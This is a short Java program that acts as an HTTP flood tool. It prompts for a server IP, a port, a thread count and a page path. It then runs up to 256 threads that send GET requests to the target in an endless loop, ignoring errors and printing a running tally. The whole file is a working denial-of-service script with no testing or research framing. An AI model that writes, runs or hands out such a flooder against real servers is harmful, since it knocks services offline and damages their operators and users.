import java.util.*;
import java.net.*;
import java.io.*;

class thr1 extends Thread
{
	static int cou1=0;
	
	@Override
	public void run()
	{
		while(true)
		{
			try
			{
				Socket ns1=new Socket(Main.ip1, Main.port1);
				ns1.setSoTimeout(1000);
				ns1.getOutputStream().write(("GET "+Main.req1+" HTTP/1.1\r\nConnection: Keep-Alive\r\n\r\n").getBytes());
				if(Main.ans1)
					ns1.getInputStream().read();
				ns1.close();
			}
			catch (Exception e)
			{}
			cou1++;
			if(cou1%1000==0)
				System.out.println(cou1/1000+"k");
		}
	}
}

public class Main
{
	static String ip1;
	static int port1;
	static boolean ans1;
	static String req1;
	
	public static void main(String[] args)
	{
		System.out.println("Enter server IP (x.x.x.x):");
		Scanner input = new Scanner(System.in);
		ip1=input.next();
		System.out.println("Enter server PORT (0-65535):");
		port1=input.nextInt();
		System.out.println("Enter threads count (1-256):");
		int thrc1=input.nextInt();
		System.out.println("Wait for response (0-1):");
		ans1=input.next().equals("1");
		System.out.println("Enter request page (/):");
		req1=input.next();
		thr1[] ta1=new thr1[thrc1];
		for(int i=0;i<ta1.length;i++)
		{
			ta1[i]=new thr1();
			ta1[i].start();
		}
		input.next();
		System.out.println("-finished-");
	}
}
